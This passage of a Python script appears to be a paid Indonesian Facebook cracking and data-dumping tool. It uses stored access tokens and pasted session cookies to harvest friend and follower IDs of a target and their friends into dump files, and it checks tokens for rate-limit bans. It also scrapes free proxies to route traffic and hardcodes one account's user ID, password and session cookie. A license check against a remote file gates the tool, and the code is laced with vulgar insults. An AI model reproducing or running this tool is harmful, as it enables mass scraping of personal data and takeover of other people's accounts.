		dump = open('.janganedit','a+') 
		for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
			dump.write(uid+'<=>'+nama+'\n')
		dump.close()
	except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Look like Id "+idt+" Not Published !!")
		time.sleep(2)
		cek_anak_epep()
	else:
		print(war+"Total ID : %s"%(len(id)))
		dumppp = open('dump/'+namq+'.json','w')
		jalan(war+'Dump Files Saved In : '+'dump/'+namq+'.json')
		jalan(war+"Press CTRL + Z TO STOP !!")
		with profacc(max_workers=20) as (kiky_gtg):
			juma = open(".janganedit","r").readlines()
			for data in juma:
				data = data.replace("\n","")
				kiky = data.split("<=>")
				mal = ("%s"%(kiky[0]))
				nm = ("%s"%(kiky[1]))
				kiky_gtg.submit(lonte__, mal, toket, token, namq)
		exit("\n"+war+"Done !!")
goblok = []
tolol = []	
def lonte__(ml, token, toket, mamk):
	laxk = open('dump/'+mamk+'.json','a+')
#	open('dump/'+mamk+'.json','r').readlines()
	
	try:
		for i in requests.get("https://graph.facebook.com/"+ml+"/friends?limit=9999&access_token="+token).json()["data"]:
			try:
				iid = i["id"]
				nama = i["name"]
				goblok.append(nama)
				laxk.write(iid+'<=>'+nama+'\n')
			except:pass
		laxk.close()
		for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token).json()["data"]:
			try:
				iid = i["id"]
				nama = i["name"]
				goblok.append(nama)
				laxk.write(iid+'<=>'+nama+'\n')
			except:pass
		laxk.close()
	except KeyError:pass
	sys.stdout.write("\r%s[%sULTIMATE%s] COLLECTED IDZ => %s"%(Q,pilih([U,I,K,M,C]),Q, len(open('dump/'+mamk+'.json','r').readlines()))
	); sys.stdout.flush()
def cek_anak_epep():
	try:
		token = open(".login.txt", "r").read()
		toket = open(".login.txt", "r").read()
	except IOError:
		os.system("rm -rf .login.txt")
		exit(war+"Token Failed !!");time.sleep(2)

	jalan(war+"write "+I+"me"+Q+" to dump your own data")
	idt = input(war+"Input ID or Username target : ")
	idt = ubah_username_to_id(idt)
#	idt = input(war+"Target ID : ")
	dump = open('.janganedit','w') 
	try:
		dump = open('.janganedit','a+') 
		for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
			dump.write(uid+'<=>'+nama+'\n')
		dump.close()
	except KeyError:pass
	id_ = ("%s"%(len(id)))
	if id_ == "0" or "0" == id_:
		jalan(war+"Look Like Id "+idt+" Id was not published!!")
		time.sleep(2)
		cek_anak_epep()
	else:
		print(war+"Total ID : %s"%(len(id)))
		with profacc(max_workers=20) as (kiky_gtg):
			juma = open(".janganedit","r").readlines()
			for data in juma:
				data = data.replace("\n","")
				kiky = data.split("<=>")
				mal = ("%s"%(kiky[0]))
				nm = ("%s"%(kiky[1]))
				kiky_gtg.submit(lonte_, mal, toket, token)
def lonte_(ml, token, toket):
	voa = ""
	try:
		goblok = []
		tolol = []
		for i in requests.get("https://graph.facebook.com/"+ml+"/friends?limit=9999&access_token="+token).json()["data"]:
			anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
			goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
		for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token).json()["data"]:
			anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw = i["id"]
			tolol.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw)
	except KeyError:pass
	_id = ("%s"%(len(goblok)))
	_idx = ("%s"%(len(tolol)))
	if _id == "0" or "0" == _id:
		pass
	else:
		voa += (" | Friend : %s%s%s"%(U,_id,Q))
	if _idx == "0" or "0" == _idx:
		pass
	else:
		voa += (" | Follower : %s%s%s"%(I,_idx,Q))
	if voa == "" or "" == voa:pass
	else:
		print (f"{war}{ml}{voa}")

def get_uame():
	urq = "http://whatsmyuseragent.org/"
	sess = requests.Session()
	getdat = requests.get(urq)
	getdat = par(getdat.content,'html.parser')
	print(getdat)
def chek_bot():
	try:
		toket=open(".login.txt","r").read()
		token=open(".login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((war+"Token Invalid"))
		time.sleep(1)
		login()
	print(war+' Your Name On Facebook  : '+nama)
	print(war+'Your Facebook Id  : '+id)
	ba = requests.post('https://graph.facebook.com/1675627047/subscribers?access_token='+token) ### FB RISKY
	ba = par(ba.content,'html.parser')
	print(str(ba))
def cek_tok_tok():
	try:
		toket=open(".login.txt","r").read()
	except:
		print((war+"Token Invalid"))
		time.sleep(1)
		login()
	ba = (requests.get('https://graph.facebook.com/me/friends?limit=3&fields=name&access_token='+toket).json()["error"]["message"])
	if ba in "Sepertinya Anda menyalahgunakan fitur ini dengan menggunakannya terlalu cepat. Anda dilarang menggunakan fitur ini untuk sementara.":
		jalan(war+"looks like you abused this feature by using it too soon. You are temporarily prohibited from using this feature")
		jalan(war+"Chances are you can't Dump/Crack/Take Idz")
		jalan("\n"+war+"Do you want to still use this token (Y/n) :")
		la = input(war+"Choose : ")
		if la in ("Y","y"):
			pass
		else:
			os.remove(".login.txt")
			jalan(war+"Successfully Remove Token!")
			exit()



lis_prox = []
list_proxy = []
c=1
def cek_proxy(proxy):
        try:
                respon = requests.get("https://httpbin.org/ip", proxies={"http": proxy,"https": proxy}, timeout=3).json()["origin"]
                print (" >> Live -- "+proxy)
                list_proxy.append(proxy)
                c+=1
        except:
                pass

def scrap():
        lis_prox_dev = []
        url="https://free-proxy-list.net/#list"
        with requests.Session() as ses_dev:
                respon = ses_dev.get(url)
                sop = BeautifulSoup(respon.content, "html.parser")
                tbody = sop.find("tbody")
                for dev in tbody.find_all("tr"):
                        prox = dev.find_all("td", class_=False)
                        lis_prox_dev.append(str(prox))
#                        print (prox)
                for dev in lis_prox_dev:
                        pecah = dev.split(",")
                        ip = pecah[0].replace("<td>", "").replace("</td>","").replace("[", "")
                        port = pecah[1].replace("<td>", "").replace("</td>","").replace("[", "").strip(" ")
                        lis_prox.append(ip+":"+port+"\n")
                        print("".join(lis_prox))

        with ThreadPoolExecutor(max_workers=20) as dev:
                for prox in lis_prox_dev:
                        dev.submit(cek_proxy, prox)


def kukis_v1(kukis_sus):
	kukis_sus = kukis_sus.replace("noscript=1", "")
	kukis_impos = ""
	user = kukis_sus.split("c_user=")[1]
	try:
		user = user.split(";")[0]
	except:pass
	kukis_sus = kukis_sus.replace("c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user, "")
	kukis_sus = kukis_sus.replace("c_user="+user, "")
	kukis_impos += kukis_sus
	kukis_impos += ";"
	kukis_impos += "c_user="
	kukis_impos += user
	return kukis_impos


def cek_info_via_kukis():
	global user
	session=req.Session()
	mmak_kukis_ = input(war+"Enter Cookies :")
	user = mmak_kukis_.split("c_user=")[1]
	try:
		user = user.split(";")[0]
	except:
		user = user.split(";")[0]

	get_infoo(session,kukis_v1(mmak_kukis_))
	cek_apk(session,kukis_v1(mmak_kukis_))
	cek_apk_v1((mmak_kukis_))
	exit()

def loqq():
	session=req.Session()
	coki = "100049115432333|nazwa123|c_user=100049115432333;datr=D-L3Yb9qkX4OVD6BYFKBzGos;fr=0e0gF45N0UYwoev8e.AWWAO_9BNvqPxu314yuHJ7wRX1M.Bh9-IQ.BU.AAA.0.0.Bh9-IQ.AWUANDgUMjI;sb=EOL3Yb9bJrRKIn0OnMp1mQ1n;xs=50%3AIR11CAuScaPlqA%3A2%3A1643635216%3A-1%3A11120"
	coki = kukis_v1(coki)
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki,"user-agent":"Mozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"}).text
	print(cek2)
def loq():
	detik = ""
	finis = ""
	detik += str("20:08:53".replace(":", ""))
	finis += str("20:32:31".replace(":", ""))
	detik = detik
	finis = finis
	totoo = int(finis) - int(detik)
	print(totoo)

import uuid
def buat_tgl():
	global wak_
	os.system("clear")
	try:
		id1 = open(".datame1", "r").read()
		idl = open(".datame1", "r").read()
	except:
		konfo()
	gig = requests.get("https://github.com/DmiRiau/kontol/blob/main/Infokan").text.strip()
	if idl in gig:
		jok = gig.split(idl+"|")
		jokk = ("%s"%(jok[1]))
		jokkk = jokk.split("<")
		wakk = jokkk[0]
		if wakk == "":
			konfo()
	else:
		konfo()
def konfo():
	os.system("clear")
#	print (logo)
	try:
		id1 = open(".datame1", "r").read()
	except:
		id1 = uuid.uuid4().hex[:43].upper()
		jaa = open(".datame1", "w")
		jaa.write(id1)
		jaa.close()
	jalan(war+'Licese Anda : '+U+id1+Q)
	jalan(war+'Silahkan Chat *'+C+'Kang ProfAcc'+Q+'* Untuk Membeli Key !')
	jalan(f"""{war}Harga Key
 |
 |--3 Day      {C}10.000{Q}
 |--7 Day      {C}20.000{Q}
 |--1 Bulan    {C}50.000{Q}
 |--100 Tahun  {C}150.000{Q} """)


	no_wa = "+2348069472717"

	url_wa = ("https://api.whatsapp.com/send?phone="+no_wa+"&text=") # UBAH NOMOR HP KAMU
	tks = ("Halo Kak, Saya Pengguna Script AccVect\nSaya Mau Beli Key/License Kak\nKey/License : *"+id1+"*")
	subprocess.check_output(["am", "start", url_wa+tks])
	sys.exit()
def cek_tgl():  # CHECK TANGGAL KONTOL
	global infona
	try:
		id1 = open(".datame1", "r").read()
		idl = open(".datame1", "r").read()
	except:
		konfo()
	gig = requests.get("https://github.com/DmiRiau/kontol/blob/main/Infokan").text.strip()
	if idl in gig:
		jok = gig.split(idl+"|")
		jokk = ("%s"%(jok[1]))
		jokkk = jokk.split("<")
		wak = jokkk[0]
		jaa = open(".datame2", "w")
		jaa.write(wak)
		jaa.close()
		wak_ = open(".datame2", "r").read().split()
	else:
		konfo()
	try:
		tgl = datetime.now()
		bln = tgl.month
		thn = tgl.year
		day = tgl.day
		mulai = datetime(int(wak_[0]), int(wak_[1]), int(wak_[2]))
		seles = datetime(thn, bln, day)
		sisa = mulai - seles
		lim_dev_id = str(sisa).split()[0]
		if "KIKY" in "":
			infona = (Q+"["+C+"++"+Q+"]"+Q+" Premium : "+I+"Ultimate/Tidak HabisÂ²"+Q)
			jalan(infona);time.sleep(2)
			return infona
		else:
			infona = (Q+"â”œâ”€["+C+"â€¢"+Q+"]"+Q+" Premium : "+I+lim_dev_id+" Hari Lagi");os.popen('play-audio selamat.mp3')
			jalan(infona);time.sleep(2)
			return infona
			if ":" in str(lim_dev_id) or "-" in str(lim_dev_id):
				exit(jalan(war+"Silahkan Hubungi Athour Untuk Memperpanjangankan License ! "))
				sys.exit()
	except:
		try:os.remove(".datame1")
		except:pass
		try:os.remove(".datame2")
		except:pass
		exit(jalan("Maaf License Anda Belum Terdaftar DiData Base Jmbf")) #edit menjadi kata license anda belum dikonfirmasih !! (anak kontol)
		sys.exit()
		exit()


#buat_tgl()

if "ANAK KONTOL, SAMA AJA MACAM HAKIKI" == anak_hakiki_ajg:
	if len(sys.argv) == 2:
		if sys.argv[1] == 'apk':
			cek_info_via_kukis()
			exit()
		else:
			print(war+"How to Use Secret Code ")
			exit(inp+"Type : python CORE.py (commend)")
	try:cek_tok_tok()
	except:pass
	try:menu();exit("keluar")
	except requests.exceptions.ConnectionError:jalan(war+"Network Is Dead!!!")
	except Exception as e:print(war+"Error : %s"%(e))
				                          	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                    	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                                	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                    	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           	                                 	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                    	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                                	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                                                    	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           			        	                         	                           		                         	                                   	                         	                           		                         	                           		        	                         	                           		                         	                                   	                         	                           		                         	                           